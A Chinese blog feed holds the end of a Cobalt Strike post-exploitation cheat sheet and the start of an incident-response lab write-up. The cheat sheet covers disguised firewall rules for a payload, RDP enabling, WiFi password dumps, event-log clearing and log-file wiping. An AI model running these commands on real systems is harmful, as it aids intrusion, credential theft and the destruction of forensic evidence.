&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">netsh firewall show config
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h3 id="关闭防墙">关闭防⽕墙&lt;/h3>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">netsh&lt;/span> &lt;span class="nx">firewall&lt;/span> &lt;span class="nx">set&lt;/span> &lt;span class="nx">opmode&lt;/span> &lt;span class="nx">disable&lt;/span> &lt;span class="c1">//Windows Server 2003 系统及之前的版本&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">netsh&lt;/span> &lt;span class="nx">advfirewall&lt;/span> &lt;span class="nx">set&lt;/span> &lt;span class="nx">allprofiles&lt;/span> &lt;span class="nx">state&lt;/span> &lt;span class="nx">off&lt;/span> &lt;span class="c1">//Windows Server 2003 系统及之后的版本&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>⼀般来说不要操作防⽕墙的开关，⻛险极⼤，只需要查看配置即可&lt;br>
利⽤允许的⼊站端⼝:&lt;br>
查看已放⾏端⼝:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell netsh firewall show portopening
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250717214640.png" alt="image.png">&lt;br>
根据防⽕墙配置，⽬标主机已放⾏ TCP 7001 端⼝的⼊站流量（对应 WebLogic 服务端⼝）。我们可以利⽤这个开放端⼝进⾏ Beacon 连接 这仅表示：&lt;br>
添加防⽕墙规则:&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-gdscript3" data-lang="gdscript3">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 放⾏7001端⼝的⼊站流量（伪装为WebLogic）&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">netsh&lt;/span> &lt;span class="n">advfirewall&lt;/span> &lt;span class="n">firewall&lt;/span> &lt;span class="n">add&lt;/span> &lt;span class="n">rule&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;WebLogic_Service&amp;#34;&lt;/span> &lt;span class="n">dir&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="ow">in&lt;/span> &lt;span class="n">protocol&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">TCP&lt;/span> &lt;span class="n">localport&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">7001&lt;/span> &lt;span class="n">action&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">allow&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># 放⾏CS⽊⻢进程路径（可选）&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">netsh&lt;/span> &lt;span class="n">advfirewall&lt;/span> &lt;span class="n">firewall&lt;/span> &lt;span class="n">add&lt;/span> &lt;span class="n">rule&lt;/span> &lt;span class="n">name&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;Java_Update&amp;#34;&lt;/span> &lt;span class="n">dir&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="ow">in&lt;/span> &lt;span class="n">program&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="s2">&amp;#34;C:\Windows\Temp\payload.exe&amp;#34;&lt;/span> &lt;span class="n">action&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">allow&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>利⽤ ICMP 协议&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">https://github.com/krabelize/icmpdoor
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>DNS隧道&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">https://github.com/iagox86/dnscat2
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="0x12-rdp操作相关">0x12 RDP操作相关&lt;/h1>
&lt;h2 id="查看rdp端">查看RDP端⼝&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell reg query &amp;#34;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&amp;#34; /v PortNumber
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250722133525.png" alt="image.png">&lt;br>
为16进制数0xd3d，转换为10进制就是3389&lt;/p>
&lt;h2 id="开放rdp服务">开放RDP服务&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell reg add &amp;#34;HKLM\SYSTEM\CurrentControlSet\control\Terminal Server&amp;#34; /v fDenyTSConnections /d 0 /t REG_DWORD /f
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250722133644.png" alt="image.png">&lt;/p>
&lt;h2 id="开放rdp端">开放RDP端⼝&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell netsh advfirewall firewall add rule name=&amp;#34;Remote Desktop&amp;#34; protocol=TCP dir=in localport=3389 action=allow
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250722133732.png" alt="image.png">&lt;/p>
&lt;h2 id="离线破解rdp连接密码">离线破解RDP连接密码&lt;/h2>
&lt;p>查看是否存在凭证：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250722133858.png" alt="image.png">&lt;/p>
&lt;h2 id="获取wifi密码">获取WiFi密码&lt;/h2>
&lt;p>查看连接过的Wifi名称：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">netsh wlan show profiles
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250722134654.png" alt="image.png">&lt;br>
如果乱码可以下载下来看&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell netsh wlan show profiles &amp;gt; wlan.txt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>查看指定Wifi的密码：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">netsh wlan show profile name=&amp;#34;WIFI名称&amp;#34; key=clear
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250722134819.png" alt="image.png">&lt;/p>
&lt;h2 id="查看代理">查看代理&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">shell reg query &amp;#34;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Internet Settings&amp;#34;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250722135014.png" alt="image.png">&lt;/p>
&lt;h1 id="0x13-志痕迹相关">0x13 ⽇志痕迹相关&lt;/h1>
&lt;h2 id="清除事件志">清除事件⽇志&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;span class="lnt">9
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">wevtutil cl &amp;#34;Windows PowerShell&amp;#34;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">wevtutil cl &amp;#34;Security&amp;#34;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">wevtutil cl &amp;#34;System&amp;#34;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">wevtutil cl &amp;#34;Application&amp;#34;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Security：登录/特权操作记录
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Windows PowerShell：PS执⾏历史
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">System：系统服务/驱动事件
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Application：应⽤程序事件
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="停志相关服务">停⽌⽇志相关服务&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">阻⽌新⽇志⽣成
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">禁⽤事件转发功能
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">中断⽇志记录链
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sc stop Schedule
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sc stop wecsvc
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sc stop eventlog
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250722135228.png" alt="image.png">&lt;/p>
&lt;h2 id="永久禁志服务">永久禁⽤⽇志服务&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">sc config EventLog start= disabled
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h2 id="志件覆盖">⽇志⽂件覆盖&lt;/h2>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl"># 物理覆盖⽇志⽂件
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">cipher /w:C:\Windows\System32\winevt\Logs\Security.evtx
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">使⽤cipher⼯具进⾏3次覆盖写⼊
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">防⽌⽂件恢复⼯具提取⽇志
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="0x13-cs插件">0x13 CS插件&lt;/h1>
&lt;h4 id="ola">OLa&lt;/h4>
&lt;p>下载地址：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">https://github.com/d3ckx1/OLa/tree/main
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>cs2插件，直接可以在cs2中使用：&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250717212946.png" alt="image.png">&lt;/p>
&lt;h4 id="taowu">taowu&lt;/h4>
&lt;p>下载地址：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">https://github.com/Mr-xn/taowu-cobalt-strike
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>cs2插件&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250717213252.png" alt="image.png">&lt;/p>
&lt;h4 id="lstar---aggressor">LSTAR - Aggressor&lt;/h4>
&lt;p>下载地址：&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">https://github.com/lintstar/LSTAR/
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>cs插件&lt;br>
&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250717213634.png" alt="image.png">&lt;/p></description></item><item><title>【知攻善防靶场】Linux1</title><link>http://localhost:1313/p/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2%E9%9D%B6%E5%9C%BAlinux1/</link><pubDate>Thu, 28 Aug 2025 00:00:00 +0000</pubDate><guid>http://localhost:1313/p/%E7%9F%A5%E6%94%BB%E5%96%84%E9%98%B2%E9%9D%B6%E5%9C%BAlinux1/</guid><description>&lt;img src="http://localhost:1313/images/8.webp" alt="Featured image of post 【知攻善防靶场】Linux1" />&lt;h1 id="前景需要">前景需要&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">看监控的时候发现webshell告警&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">领导让你上机检查你可以救救安服仔吗&lt;/span>&lt;span class="err">！！&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mf">1.&lt;/span> &lt;span class="nx">黑客的IP地址&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mf">2.&lt;/span> &lt;span class="nx">遗留下的三个flag&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;strong>虚拟机账号/密码&lt;/strong>&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">账号&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">密码&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="nx">defend&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">defend&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">账号&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">密码&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="nx">root&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">defend&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="1-黑客的ip地址">1. 黑客的IP地址&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">查看日志文件&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">Linux查看&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="kd">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">wtmp文件查看可疑IP登陆&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">last&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">f&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="kd">var&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">log&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">wtmp&lt;/span> &lt;span class="nx">或者直接使用命令&lt;/span> &lt;span class="nx">lastlog命令&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">可以看出192&lt;/span>&lt;span class="mf">.168.75.129&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">非常可疑&lt;/span>&lt;span class="err">。&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250301201516.png" alt="Pasted image 20250301201516">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">答案&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="mf">192.168.75.129&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="2-第一个flag">2. 第一个flag&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">黑客使用root登录了系统&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">我们可以先去root用户下看看黑客使用了什么命令&lt;/span>&lt;span class="err">：&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">使用命令&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="nx">history&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">得到第一个flag&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="nx">thisismybaby&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>&lt;img src="https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/Pasted%20image%2020250301201537.png" alt="Pasted image 20250301201537">&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">答案&lt;/span>&lt;span class="err">：&lt;/span>&lt;span class="nx">flag&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">thisismybaby&lt;/span>&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;h1 id="3-第二个flag">3. 第二个flag&lt;/h1>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line">&lt;span class="cl">&lt;span class="nx">从第一个flag中我们可以看出&lt;/span>&lt;span class="err">，&lt;/span>&lt;span class="nx">黑客对&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">etc&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">rc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">rc&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">local进行编辑和提升了执行权限&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
